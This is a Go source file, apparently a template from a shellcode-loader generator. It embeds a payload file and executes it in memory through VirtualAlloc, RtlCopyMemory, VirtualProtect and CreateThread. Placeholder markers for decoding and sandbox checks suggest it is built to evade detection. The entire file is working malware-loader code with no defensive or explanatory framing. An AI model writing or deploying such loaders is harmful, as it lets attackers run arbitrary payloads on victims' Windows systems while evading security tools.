package main

import (
	_ "embed"
	"unsafe"

	"golang.org/x/sys/windows"
	//__IMPORT__
)

const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)

//go:embed shellcode
var shellcode []byte

//__DECODE__

func main() {
	//__SANDBOX__
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)),
		MemCommit|MemReserve, PageReadwrite)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead,
		uintptr(unsafe.Pointer(&oldProtect)))
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
	_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
